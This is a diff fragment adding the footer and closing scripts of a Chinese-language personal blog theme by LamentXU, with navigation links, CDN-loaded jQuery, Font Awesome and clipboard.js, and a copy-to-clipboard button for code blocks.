+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2026
+    LamentXU
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
